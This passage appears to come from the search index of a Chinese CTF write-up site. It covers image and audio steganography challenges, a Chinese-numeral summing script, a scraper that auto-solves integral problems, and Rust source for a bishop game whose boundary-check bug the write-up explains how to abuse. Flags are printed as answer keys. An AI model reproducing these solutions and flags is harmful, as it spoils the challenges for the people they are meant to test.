\u4f46\u53ef\u4ee5\u786e\u5b9a\u7684\u662f\uff0c\u8fd9\u4e9b\u770b\u4f3c\u5947\u602a\u7684\u82b1\u7eb9\u91cc\u786e\u5b9e\u9690\u85cf\u7740\u4e00\u4e9b\u4fe1\u606f\uff0c\u6216\u8bb8\u662f\u5730\u4e0b\u91d1\u77ff\u7684\u85cf\u5b9d\u56fe\u4e5f\u672a\u53ef\u77e5\u3002 \u89e3\u9898\u601d\u8def \u00b6 \u9898\u76ee \u5085\u91cc\u53f6\u5149\u5b66 \u662f\u91cd\u70b9\uff0c\u53ef\u4ee5\u8003\u8651\u56fe\u7247\u662f\u5426\u7ecf\u8fc7\u5feb\u901f\u5085\u91cc\u53f6\u53d8\u6362 \u5c06\u56fe\u7247\u4e22\u5165\u5de5\u5177 Ejectamenta - WikkiMap \uff0c\u5e76\u8fdb\u884c\u5feb\u901f\u5085\u91cc\u53f6\u9006\u53d8\u6362\uff0c\u5f97\u5230\uff1a \u62fc\u63a5\u4e00\u4e0b\u5373\u53ef\u83b7\u5f97 Flag\uff1a flag{Fxurier_xptic_is_fun} \u53c2\u8003\u8d44\u6599 \u00b6 Stego Tricks - HackTricks","title":"\u6765\u81ea\u4e00\u6559\u7684\u56fe\u7247"},{"location":"misc/4f_system_middle/#_1","text":"\u5c0f P \u5728\u4e00\u6559\u505a \u5085\u91cc\u53f6\u5149\u5b66 \u5b9e\u9a8c\u65f6\uff0c\u5728\u5b9e\u9a8c\u5ba4\u7535\u8111\u7684\u6a21\u62df\u7a0b\u5e8f\u91cc\u53d1\u73b0\u4e86\u8fd9\u4e48\u4e00\u5f20\u7684\u56fe\u7247\uff1a \u6570\u7406\u57fa\u7840\u5e76\u4e0d\u624e\u5b9e\u7684\u5c0f P \u5e76\u4e0d\u77e5\u9053\u4ec0\u4e48\u4e1c\u897f\u6210\u50cf\u4f1a\u662f\u8fd9\u4e2a\u6837\u5b50\uff1a\u53c8\u6216\u8bb8\u4ec0\u4e48\u4e1c\u897f\u90fd\u4e0d\u662f\uff0c\u6bd5\u7adf\u8fd9\u53ea\u662f\u6a21\u62df ... \u4f46\u53ef\u4ee5\u786e\u5b9a\u7684\u662f\uff0c\u8fd9\u4e9b\u770b\u4f3c\u5947\u602a\u7684\u82b1\u7eb9\u91cc\u786e\u5b9e\u9690\u85cf\u7740\u4e00\u4e9b\u4fe1\u606f\uff0c\u6216\u8bb8\u662f\u5730\u4e0b\u91d1\u77ff\u7684\u85cf\u5b9d\u56fe\u4e5f\u672a\u53ef\u77e5\u3002","title":"\u9898\u76ee"},{"location":"misc/4f_system_middle/#_2","text":"\u9898\u76ee \u5085\u91cc\u53f6\u5149\u5b66 \u662f\u91cd\u70b9\uff0c\u53ef\u4ee5\u8003\u8651\u56fe\u7247\u662f\u5426\u7ecf\u8fc7\u5feb\u901f\u5085\u91cc\u53f6\u53d8\u6362 \u5c06\u56fe\u7247\u4e22\u5165\u5de5\u5177 Ejectamenta - WikkiMap \uff0c\u5e76\u8fdb\u884c\u5feb\u901f\u5085\u91cc\u53f6\u9006\u53d8\u6362\uff0c\u5f97\u5230\uff1a \u62fc\u63a5\u4e00\u4e0b\u5373\u53ef\u83b7\u5f97 Flag\uff1a flag{Fxurier_xptic_is_fun}","title":"\u89e3\u9898\u601d\u8def"},{"location":"misc/4f_system_middle/#_3","text":"Stego Tricks - HackTricks","title":"\u53c2\u8003\u8d44\u6599"},{"location":"misc/account_bot/","text":"\u9898\u76ee \u00b6 \u5982\u540c\u5f80\u5e38\u4e00\u6837\uff0c\u4f60\u7684 npy \u7a81\u7136\u4e22\u7ed9\u4f60\u4e00\u4e2a\u8d2d\u7269\u8d26\u5355\uff1a\u201c\u6211\u4eca\u5929\u4e70\u4e86\u51e0\u4e2a\u5c0f\u73a9\u610f\uff0c\u4f60\u80fd\u5e2e\u6211\u7b97\u4e00\u4e0b\u4e00\u5171\u82b1\u4e86\u591a\u5c11\u94b1\u5417\uff1f\u201d \u4f60\u5fc3\u60f3\uff1a \u53c8\u53cc\u53d2\u53d5\u8981\u5f00\u59cb\u5403\u571f\u4e86 \u8fd9\u4e0d\u662f\u5f88\u7b80\u5355\u5417\uff1f\u7535\u5b50\u8868\u683c\u91cc\u9762\u4e00\u62d6\u52a8\u5c31\u7b97\u51fa\u6765\u4e86 \u53ea\u4e0d\u8fc7\u62ff\u5230\u8d26\u5355\u4e4b\u540e\u4f60\u624d\u6ce8\u610f\u5230\uff0c\u4f3c\u4e4e\u662f\u4e3a\u4e86\u5241\u624b\u65f6\u66f4\u52a0\u7684\u5b89\u5fc3\uff0c\u8fd9\u6b21\u7684\u8d26\u5355\u4e0a\u9762\u7684\u91d1\u989d\u5168\u4f7f\u7528\u4e86\u4e2d\u6587\u5927\u5199\u6570\u5b57 \u89e3\u9898\u601d\u8def \u00b6 \u4e3b\u8981\u662f\u5c06\u4e2d\u6587\u5927\u5199\u91d1\u989d\u8f6c\u5316\u4e3a\u6570\u5b57\u91d1\u989d\uff0c\u6c42\u548c\u4ea4\u7ed9 EXCEL \u5c31\u597d\u5566~w 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 digit = [ '\u96f6' , '\u58f9' , '\u8d30' , '\u53c1' , '\u8086' , '\u4f0d' , '\u9646' , '\u67d2' , '\u634c' , '\u7396' ] tens = [ '\u62fe' , '\u4f70' , '\u4edf' , '\u4e07' ] yuan = [ '\u5143' , '\u89d2' , '\u5206' ] l = [] while True : try : l . append ( input ()) except EOFError : break for s in l : tmp , cnt , total = 0 , 0 , 0 for i in s : if i in digit : tmp += digit . index ( i ) elif i in tens : if tmp == 0 : tmp = 1 cnt += tmp * 10 ** ( tens . index ( i ) + 1 ) tmp = 0 elif i in yuan : if tmp : cnt += tmp tmp = 0 total += cnt * 10 ** ( - yuan . index ( i )) cnt = 0 print ( \" %.2f \" % total )","title":"\u4ece\u96f6\u5f00\u59cb\u7684\u8bb0\u8d26\u5de5\u5177\u4eba"},{"location":"misc/account_bot/#_1","text":"\u5982\u540c\u5f80\u5e38\u4e00\u6837\uff0c\u4f60\u7684 npy \u7a81\u7136\u4e22\u7ed9\u4f60\u4e00\u4e2a\u8d2d\u7269\u8d26\u5355\uff1a\u201c\u6211\u4eca\u5929\u4e70\u4e86\u51e0\u4e2a\u5c0f\u73a9\u610f\uff0c\u4f60\u80fd\u5e2e\u6211\u7b97\u4e00\u4e0b\u4e00\u5171\u82b1\u4e86\u591a\u5c11\u94b1\u5417\uff1f\u201d \u4f60\u5fc3\u60f3\uff1a \u53c8\u53cc\u53d2\u53d5\u8981\u5f00\u59cb\u5403\u571f\u4e86 \u8fd9\u4e0d\u662f\u5f88\u7b80\u5355\u5417\uff1f\u7535\u5b50\u8868\u683c\u91cc\u9762\u4e00\u62d6\u52a8\u5c31\u7b97\u51fa\u6765\u4e86 \u53ea\u4e0d\u8fc7\u62ff\u5230\u8d26\u5355\u4e4b\u540e\u4f60\u624d\u6ce8\u610f\u5230\uff0c\u4f3c\u4e4e\u662f\u4e3a\u4e86\u5241\u624b\u65f6\u66f4\u52a0\u7684\u5b89\u5fc3\uff0c\u8fd9\u6b21\u7684\u8d26\u5355\u4e0a\u9762\u7684\u91d1\u989d\u5168\u4f7f\u7528\u4e86\u4e2d\u6587\u5927\u5199\u6570\u5b57","title":"\u9898\u76ee"},{"location":"misc/account_bot/#_2","text":"\u4e3b\u8981\u662f\u5c06\u4e2d\u6587\u5927\u5199\u91d1\u989d\u8f6c\u5316\u4e3a\u6570\u5b57\u91d1\u989d\uff0c\u6c42\u548c\u4ea4\u7ed9 EXCEL \u5c31\u597d\u5566~w 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 digit = [ '\u96f6' , '\u58f9' , '\u8d30' , '\u53c1' , '\u8086' , '\u4f0d' , '\u9646' , '\u67d2' , '\u634c' , '\u7396' ] tens = [ '\u62fe' , '\u4f70' , '\u4edf' , '\u4e07' ] yuan = [ '\u5143' , '\u89d2' , '\u5206' ] l = [] while True : try : l . append ( input ()) except EOFError : break for s in l : tmp , cnt , total = 0 , 0 , 0 for i in s : if i in digit : tmp += digit . index ( i ) elif i in tens : if tmp == 0 : tmp = 1 cnt += tmp * 10 ** ( tens . index ( i ) + 1 ) tmp = 0 elif i in yuan : if tmp : cnt += tmp tmp = 0 total += cnt * 10 ** ( - yuan . index ( i )) cnt = 0 print ( \" %.2f \" % total )","title":"\u89e3\u9898\u601d\u8def"},{"location":"misc/audio_frequency_stego/","text":"\u9898\u76ee \u00b6 What a mundane song, it's just the same note repeated over and over. But could there perhaps be two different notes? \u89e3\u9898\u601d\u8def \u00b6 \u7531\u9898\u610f\u63a8\u6d4b\u5e94\u8be5\u6709\u660e\u663e\u533a\u522b\u7684\u4e24\u79cd\u6ce2\u5f62 \u6253\u5f00 audio_frequency_stego.wav \u653e\u5927\u6ce2\u5f62\uff0c\u4e0d\u50cf Unpleasant music \u90a3\u6837\u6709\u660e\u663e\u7684 01 \u6ce2\u5f62 \u4f46\u7a0d\u7a0d\u7f29\u5c0f\u540e\uff0c\u5c31\u53ef\u4ee5\u53d1\u73b0\u6709\u4e24\u79cd\u4e0d\u4e00\u6837\u7684\u6ce2\u5f62\uff01\\(\u03a6\u03c9\u03a6)/ \u6839\u636e\u524d 8 \u4e2a 01 \u503c\uff0c\u53ef\u4ee5\u5224\u65ad\u5bc6\u5ea6\u8f83\u9ad8\u7684\u5bf9\u5e94 1\u3001\u5bc6\u5ea6\u8f83\u4f4e\u7684\u5bf9\u5e94 0\uff0c\u5e76\u5f97\u5230\u5b57\u6bcd f \uff0c\u63a5\u4e0b\u6765\u5c31\u53ef\u4ee5\u653e\u5fc3\u624b\u5de5\u83b7\u53d6\u540e\u7eed\u90e8\u5206\u4e86 (\u03a6\u02cb\u03c9\u02ca\u03a6)","title":"audio-frequency-stego"},{"location":"misc/audio_frequency_stego/#_1","text":"What a mundane song, it's just the same note repeated over and over. But could there perhaps be two different notes?","title":"\u9898\u76ee"},{"location":"misc/audio_frequency_stego/#_2","text":"\u7531\u9898\u610f\u63a8\u6d4b\u5e94\u8be5\u6709\u660e\u663e\u533a\u522b\u7684\u4e24\u79cd\u6ce2\u5f62 \u6253\u5f00 audio_frequency_stego.wav \u653e\u5927\u6ce2\u5f62\uff0c\u4e0d\u50cf Unpleasant music \u90a3\u6837\u6709\u660e\u663e\u7684 01 \u6ce2\u5f62 \u4f46\u7a0d\u7a0d\u7f29\u5c0f\u540e\uff0c\u5c31\u53ef\u4ee5\u53d1\u73b0\u6709\u4e24\u79cd\u4e0d\u4e00\u6837\u7684\u6ce2\u5f62\uff01\\(\u03a6\u03c9\u03a6)/ \u6839\u636e\u524d 8 \u4e2a 01 \u503c\uff0c\u53ef\u4ee5\u5224\u65ad\u5bc6\u5ea6\u8f83\u9ad8\u7684\u5bf9\u5e94 1\u3001\u5bc6\u5ea6\u8f83\u4f4e\u7684\u5bf9\u5e94 0\uff0c\u5e76\u5f97\u5230\u5b57\u6bcd f \uff0c\u63a5\u4e0b\u6765\u5c31\u53ef\u4ee5\u653e\u5fc3\u624b\u5de5\u83b7\u53d6\u540e\u7eed\u90e8\u5206\u4e86 (\u03a6\u02cb\u03c9\u02ca\u03a6)","title":"\u89e3\u9898\u601d\u8def"},{"location":"misc/basic_math_simulator/","text":"\u9898\u76ee \u00b6 \u89e3\u9898\u601d\u8def \u00b6 \u81ea\u5df1\u7b97\u7684\u8bdd\u4e00\u9053\u9898\u90fd\u7b97\u4e0d\u51fa\u6765(\u03a6\u76bf\u03a6) \u76f4\u63a5\u4f7f\u7528\u5f00\u53d1\u8005\u5de5\u5177\u67e5\u770b\u7f51\u9875\uff0c\u7b26\u53f7\u770b\u4e0a\u53bb\u90fd\u4e0d\u6613\u722c\u53d6\uff08\u5f53\u65f6\u6ca1\u6709\u7981\u6389 JS\uff09 \u4f7f\u7528 curl \u83b7\u53d6\u7f51\u9875\uff0c\u53d1\u73b0\u4f7f\u7528\u7684\u662f LaTex \u4f7f\u7528 sympy \u8ba1\u7b97\u5b9a\u79ef\u5206\uff0c LaTex \u6587\u672c\u53ef\u4ee5\u4f7f\u7528 parse_latex \u8f6c\u6362 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 import requests from lxml import etree from sympy import * from sympy.parsing.latex import parse_latex s = requests . session () base_url = '<site-url>' token = '<user-token>' s . get ( base_url + 'login?token=' + token ) x = symbols ( 'x' ) while True : r = s . get ( base_url ) while r . status_code != 200 : r = s . get ( base_url ) html = etree . HTML ( r . content ) rest = html . xpath ( '//h1[@class=\"cover-heading\"]' ) if rest : print ( rest [ 0 ] . text ) exp = html . xpath ( '/html/body/div/div/div/center/p' )[ 0 ] . text [ 2 : - 1 ] tmprg = exp . split ( ' ' )[ 0 ] rge = str ( parse_latex ( tmprg + '{d x}' ))[ 10 :] # \u622a\u6389 Integral(1 exp = parse_latex ( exp [ len ( tmprg ): exp . find ( '{d x}' )]) . subs ( symbols ( 'e' ), E ) ans = N ( \"Integral(\" + str ( exp ) + rge , 15 ) s . post ( base_url + 'submit' , data = { 'ans' : ans }) else : break r = s . get ( base_url ) print ( r . content ) parse_latex \u4f1a\u5c06\u5e38\u6570 \\({\\displaystyle e}\\) \u8bc6\u522b\u4e3a\u7b26\u53f7\uff0c\u9700\u8981\u8fdb\u884c\u66ff\u6362 parse_latex \u5bf9\u4e8e\u90e8\u5206 LaTex \u8868\u8fbe\u5f0f\u4f1a\u51fa\u73b0\u89e3\u6790\u9519\u8bef\u7684\u60c5\u51b5\uff0c\u56e0\u6b64\u4e0d\u80fd\u76f4\u63a5\u5bf9\u539f\u59cb\u8868\u8fbe\u5f0f\u4f7f\u7528\uff0c\u5982 \\(\\int_{2}^{\\frac{9}{2}} \\frac{1}{4} \\, x + 2 \\, \\sqrt{x} + \\frac{2}{x} - \\ln(x)\\,{d x}\\) \uff0c\u53ef\u4ee5\u770b\u5230\u2193\u9700\u8981\u8ba1\u7b97\u5b9a\u79ef\u5206\u7684\u533a\u57df\u5212\u5206\u9519\u4e86 1 2 >>> parse_latex(r'\\int_{2}^{\\frac{9}{2}} \\frac{1}{4} \\, x + 2 \\, \\sqrt{x} + \\frac{2}{x} - \\ln(x)\\,{d x}') -dx*log(x, E) + 2*sqrt(x) + x*Integral(1/4, (x, 2, 9/2)) + 2/x \u505a\u5b8c \\(400\\) \u9053\u9898\u5c31\u80fd\u62ff\u5230 Flag \u4e86(\u03a6\u02cb\u03c9\u02ca\u03a6)","title":"\u8d85\u57fa\u7840\u7684\u6570\u7406\u6a21\u62df\u5668"},{"location":"misc/basic_math_simulator/#_1","text":"","title":"\u9898\u76ee"},{"location":"misc/basic_math_simulator/#_2","text":"\u81ea\u5df1\u7b97\u7684\u8bdd\u4e00\u9053\u9898\u90fd\u7b97\u4e0d\u51fa\u6765(\u03a6\u76bf\u03a6) \u76f4\u63a5\u4f7f\u7528\u5f00\u53d1\u8005\u5de5\u5177\u67e5\u770b\u7f51\u9875\uff0c\u7b26\u53f7\u770b\u4e0a\u53bb\u90fd\u4e0d\u6613\u722c\u53d6\uff08\u5f53\u65f6\u6ca1\u6709\u7981\u6389 JS\uff09 \u4f7f\u7528 curl \u83b7\u53d6\u7f51\u9875\uff0c\u53d1\u73b0\u4f7f\u7528\u7684\u662f LaTex \u4f7f\u7528 sympy \u8ba1\u7b97\u5b9a\u79ef\u5206\uff0c LaTex \u6587\u672c\u53ef\u4ee5\u4f7f\u7528 parse_latex \u8f6c\u6362 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 import requests from lxml import etree from sympy import * from sympy.parsing.latex import parse_latex s = requests . session () base_url = '<site-url>' token = '<user-token>' s . get ( base_url + 'login?token=' + token ) x = symbols ( 'x' ) while True : r = s . get ( base_url ) while r . status_code != 200 : r = s . get ( base_url ) html = etree . HTML ( r . content ) rest = html . xpath ( '//h1[@class=\"cover-heading\"]' ) if rest : print ( rest [ 0 ] . text ) exp = html . xpath ( '/html/body/div/div/div/center/p' )[ 0 ] . text [ 2 : - 1 ] tmprg = exp . split ( ' ' )[ 0 ] rge = str ( parse_latex ( tmprg + '{d x}' ))[ 10 :] # \u622a\u6389 Integral(1 exp = parse_latex ( exp [ len ( tmprg ): exp . find ( '{d x}' )]) . subs ( symbols ( 'e' ), E ) ans = N ( \"Integral(\" + str ( exp ) + rge , 15 ) s . post ( base_url + 'submit' , data = { 'ans' : ans }) else : break r = s . get ( base_url ) print ( r . content ) parse_latex \u4f1a\u5c06\u5e38\u6570 \\({\\displaystyle e}\\) \u8bc6\u522b\u4e3a\u7b26\u53f7\uff0c\u9700\u8981\u8fdb\u884c\u66ff\u6362 parse_latex \u5bf9\u4e8e\u90e8\u5206 LaTex \u8868\u8fbe\u5f0f\u4f1a\u51fa\u73b0\u89e3\u6790\u9519\u8bef\u7684\u60c5\u51b5\uff0c\u56e0\u6b64\u4e0d\u80fd\u76f4\u63a5\u5bf9\u539f\u59cb\u8868\u8fbe\u5f0f\u4f7f\u7528\uff0c\u5982 \\(\\int_{2}^{\\frac{9}{2}} \\frac{1}{4} \\, x + 2 \\, \\sqrt{x} + \\frac{2}{x} - \\ln(x)\\,{d x}\\) \uff0c\u53ef\u4ee5\u770b\u5230\u2193\u9700\u8981\u8ba1\u7b97\u5b9a\u79ef\u5206\u7684\u533a\u57df\u5212\u5206\u9519\u4e86 1 2 >>> parse_latex(r'\\int_{2}^{\\frac{9}{2}} \\frac{1}{4} \\, x + 2 \\, \\sqrt{x} + \\frac{2}{x} - \\ln(x)\\,{d x}') -dx*log(x, E) + 2*sqrt(x) + x*Integral(1/4, (x, 2, 9/2)) + 2/x \u505a\u5b8c \\(400\\) \u9053\u9898\u5c31\u80fd\u62ff\u5230 Flag \u4e86(\u03a6\u02cb\u03c9\u02ca\u03a6)","title":"\u89e3\u9898\u601d\u8def"},{"location":"misc/bishop_duel/","text":"\u9898\u76ee \u00b6 2 bishops on the chessboard. Goal 1 (first flag) Lose the game by letting your bishop be captured. Goal 2 (second flag) Win by capturing the other bishop. Avoiding a draw is easy huh? But wait... Connect via nc bishop.sdc.tf 1337 main.rs 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 use std :: io ::{ stdout , Write }; use std :: process :: exit ; use std :: thread :: sleep ; use std :: time :: Duration ; /* * Can you tell this was my first rust program ever? lmao */ use crossterm ::{ cursor , execute , queue , style , terminal ::{ Clear , EnterAlternateScreen , LeaveAlternateScreen }}; use crossterm :: terminal :: ClearType ; use rand ::{ rngs , SeedableRng }; use rand :: prelude :: SliceRandom ; use text_io :: read ; static TITLE_SCREEN : & str = \" o (^) -=H=- BISHOP DUEL ] [ -- press enter to start -- /___ \\\\ \" ; // having to double escape these backslashes makes this astoundingly ugly static BOARD : & str = \" \\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ Q# - up left # spaces \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\ E# - up right # spaces \\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ Z# - down left # spaces \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\ C# - down right # spaces \\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\ D - offer draw \\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ R - resign \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\ \" ; enum Direction { UpLeft , UpRight , DownLeft , DownRight } struct Bishop { position : u16 } impl Bishop { fn get_xy ( & self ) -> ( u16 , u16 ) { let rows = self . position / 8 + 1 ; return (( self . position % 8 ) * 3 + rows , rows ); } fn move_position ( & mut self , dir : Direction , dist : u16 ) -> bool { let position_multiplier : i32 = match dir { Direction :: UpRight => - 7 , Direction :: DownLeft => 7 , Direction :: UpLeft => - 9 , Direction :: DownRight => 9 , }; let new_position = i32 :: from ( self . position ) + position_multiplier * i32 :: from ( dist ); // make sure we don't exceed the bottom and top of the chessboard if new_position < 0 || new_position > 64 { return false ; } // make sure we don't exceed the left and right edge of the chessboard match dir { Direction :: UpLeft | Direction :: DownLeft => { if self . position % 8 < dist { return false ; } } Direction :: UpRight | Direction :: DownRight => { if dist + self . position % 8 > 8 { return false ; } } } self . position = u16 :: try_from ( new_position ). unwrap (); return true ; } } fn pause ( msg : & str ) -> String { println! ( \"{}\" , msg ); read ! ( \"{} \\n \" ) } fn main () { let mut stdout = stdout (); let mut is_player_turn = true ; let mut white_bishop = Bishop { position : 5 }; let mut black_bishop = Bishop { position : 57 }; queue ! ( stdout , EnterAlternateScreen , Clear ( ClearType :: All ), style :: Print ( TITLE_SCREEN )). unwrap (); stdout . flush (). unwrap (); pause ( \"\" ); loop { let ( bb_x , bb_y ) = black_bishop . get_xy (); let ( ww_x , ww_y ) = white_bishop . get_xy (); queue ! ( stdout , Clear ( ClearType :: All ), cursor :: MoveTo ( 0 , 0 ), style :: Print ( BOARD ), cursor :: MoveTo ( bb_x , bb_y ), style :: Print ( \"BB\" ), cursor :: MoveTo ( ww_x , ww_y ), style :: Print ( \"WW\" ), cursor :: MoveTo ( 0 , 10 ) ). unwrap (); stdout . flush (). unwrap (); // this means SOMEBODY has been captured if white_bishop . position == black_bishop . position { if is_player_turn { pause ( \"You have been defeated! Your flag is REDACTED\" ); exit ( 0 ); } pause ( \"You have claimed victory! Your flag is REDACTED\" ); exit ( 0 ); } if is_player_turn { // if its the white bishop's turn execute ! ( stdout , style :: Print ( \"You are the white bishop. Input move > \" )). unwrap (); let command : String = read ! ( \"{} \\n \" ); let mut command_chars = command . chars (); if let Some ( c1 ) = command_chars . next () { match c1 { 'r' | 'R' => { pause ( \"A brave bishop shall never resign!\" ); }, 'd' | 'D' => { execute ! ( stdout , style :: Print ( \"The black bishop is thinking.\" )). unwrap (); sleep ( Duration :: from_millis ( 1000 )); execute ! ( stdout , style :: Print ( \".\" )). unwrap (); sleep ( Duration :: from_millis ( 1000 )); execute ! ( stdout , style :: Print ( \".\" )). unwrap (); sleep ( Duration :: from_millis ( 1000 )); pause ( \"Accepted! The game is a draw!\" ); break ; }, _ => { let direction : Direction = match c1 { 'e' | 'E' => Direction :: UpRight , 'z' | 'Z' => Direction :: DownLeft , 'q' | 'Q' => Direction :: UpLeft , 'c' | 'C' => Direction :: DownRight , _ => continue }; let distance = match command_chars . next () { None => continue , Some ( c2 ) => match c2 . to_digit ( 10 ) { None => continue , Some ( d ) => d as u16 } }; let successful = white_bishop . move_position ( direction , distance ); if successful { // now its the black bishop's turn is_player_turn = false ; } } } } } else { // black bishop's turn println! ( \"The black bishop is thinking...\" ); sleep ( Duration :: from_millis ( 1000 )); // get all black spaces and filter by currently accessible let curr = i32 :: from ( black_bishop . position ); let mut possible_positions = ( 0 .. 64 ). step_by ( 2 ) . map ( | i | if ( i / 8 ) % 2 == 0 { i } else { i + 1 }) . filter ( | i | ( curr - i ). abs () % 7 == 0 || ( curr - i ). abs () % 9 == 0 ). collect :: < Vec < i32 >> (); // if the white bishop is in our path, CRUSH THEM if possible_positions . contains ( & i32 :: from ( white_bishop . position )) { black_bishop . position = white_bishop . position ; is_player_turn = true ; continue ; } // otherwise, let's filter out moves that would put us in the path of the white bishop let white_curr = i32 :: from ( white_bishop . position ); if white_curr % 2 == 0 { possible_positions = possible_positions . into_iter () . filter ( | i | ( white_curr - i ) % 7 != 0 && ( white_curr - i ) % 9 != 0 ). collect :: < Vec < i32 >> (); } // otherwise, randomly select a new move let mut rng = rngs :: StdRng :: seed_from_u64 ( white_bishop . position as u64 ); let new_position = possible_positions . choose ( & mut rng ). unwrap (); black_bishop . position = u16 :: try_from ( * new_position ). unwrap (); // now its the white bishop's turn is_player_turn = true ; } } execute ! ( stdout , LeaveAlternateScreen ). unwrap (); } \u89e3\u9898\u601d\u8def \u00b6 \u4f7f\u7528 QEZC \u5728\u68cb\u76d8\u8303\u56f4\u5185\u79fb\u52a8\u65f6\uff0c\u7531\u4e8e\u8d70\u7684\u662f\u5bf9\u89d2\u7ebf\uff0c\u9ed1\u767d\u4e3b\u6559\u59cb\u7ec8\u5728\u5bf9\u5e94\u7c7b\u578b\uff08\u9ed1 / \u767d\uff09\u7684\u683c\u5b50\u5185\u79fb\u52a8\uff0c\u6ca1\u6709\u4ea4\u96c6 1 2 3 4 5 6 7 8 \\__\\\\\\\\__\\\\\\\\__\\WW\\__\\\\\\\\ Q# - up left # spaces \\\\\\\\__\\\\\\\\__\\\\\\\\__\\\\\\\\__\\ E# - up right # spaces \\__\\\\\\\\__\\\\\\\\__\\\\\\\\__\\\\\\\\ Z# - down left # spaces \\\\\\\\__\\\\\\\\__\\\\\\\\__\\\\\\\\__\\ C# - down right # spaces \\__\\\\\\\\__\\\\\\\\__\\\\\\\\__\\\\\\\\ \\\\\\\\__\\\\\\\\__\\\\\\\\__\\\\\\\\__\\ D - offer draw \\__\\\\\\\\__\\\\\\\\__\\\\\\\\__\\\\\\\\ R - resign \\\\\\\\BB\\\\\\\\__\\\\\\\\__\\\\\\\\__\\ \u60f3\u8981\u6293\u5230 black bishop \u6216\u8005\u88ab\u6293\u5230\uff0c\u9996\u5148\u8981\u79fb\u52a8\u5230\u540c\u4e00\u79cd\u7c7b\u578b\u7684\u683c\u5b50\u91cc \u90a3\u4e48\u5173\u952e\u70b9\u5c31\u662f\u51fd\u6570 move_position \u4e86\uff0c\u56e0\u4e3a\u79fb\u52a8\u5e76\u4e0d\u662f\u6309\u7167\u7c7b\u4f3c \\((x,y)\\) \u7684\u5750\u6807\u5f62\u5f0f\u3002\u5b9e\u9645\u4e0a\uff0c\u6bcf\u4e2a\u683c\u5b50\u7684\u4f4d\u7f6e\u76f8\u5f53\u4e8e\u6309\u7167\u5149\u6805\u626b\u63cf\u7684\u987a\u5e8f\u7f16\u53f7\uff0c\u6839\u636e \u5f53\u524d\u4f4d\u7f6e + \u5bf9\u5e94\u65b9\u5411\u7684\u7cfb\u6570 * \u79fb\u52a8\u683c\u6570 \u53d6\u5f97\u4e0b\u4e00\u4e2a\u4f4d\u7f6e\uff0c\u7136\u540e\u5224\u65ad\u79fb\u52a8\u662f\u5426\u6709\u6548 \u65b0\u4f4d\u7f6e\u7684\u503c\u5e94\u5728 \\([0,64]\\) \u4e4b\u95f4 \u5982\u679c\u79fb\u52a8\u65b9\u5411\u4e3a\u5de6\u4e0a/\u5de6\u4e0b\uff0c\u90a3\u4e48\u79fb\u52a8\u683c\u6570\u4e0d\u5927\u4e8e\u5f53\u524d\u4f4d\u7f6e\u7684\u503c\u6a21 \\(8\\) \u5982\u679c\u79fb\u52a8\u65b9\u5411\u4e3a\u53f3\u4e0a/\u53f3\u4e0b\uff0c\u90a3\u4e48\u79fb\u52a8\u683c\u6570\u4e0e\u5f53\u524d\u4f4d\u7f6e\u503c\u6a21 \\(8\\) \u7684\u548c\u4e0d\u5927\u4e8e \\(8\\) \u4ee5\u521d\u59cb\u4f4d\u7f6e \\(5\\) \u4e3a\u4f8b\uff0c\u4e0a\u79fb\u4e00\u5b9a\u5bfc\u81f4\u4f4d\u7f6e\u503c\u5c0f\u4e8e \\(0\\) \uff0c\u6240\u4ee5\u53ea\u8003\u8651\u4e0b\u79fb \u53f3\u4e0b\u79fb\u52a8\u4e24\u683c\u4ee5\u5185\u663e\u7136\u662f\u53ef\u884c\u7684\uff0c\u4f46\u5982\u679c\u662f \\(3\\) \u683c\u5462\uff1f\u663e\u7136\u65b0\u4f4d\u7f6e\u7684\u503c\u4e0d\u4f1a\u8d85\u8fc7 \\(64(> 5+9\\times 3)\\) \uff0c\u800c \\(3+5 \\% 8\\) \u6070\u597d\u7b49\u4e8e \\(8\\) \uff0c\u6240\u4ee5\u53ef\u4ee5\u79fb\u52a8\uff0c\u5e76\u4e14\u4f1a\u8fdb\u5165 black_bishop \u7684\u79fb\u52a8\u8303\u56f4 \u03a6\u03c9\u03a6 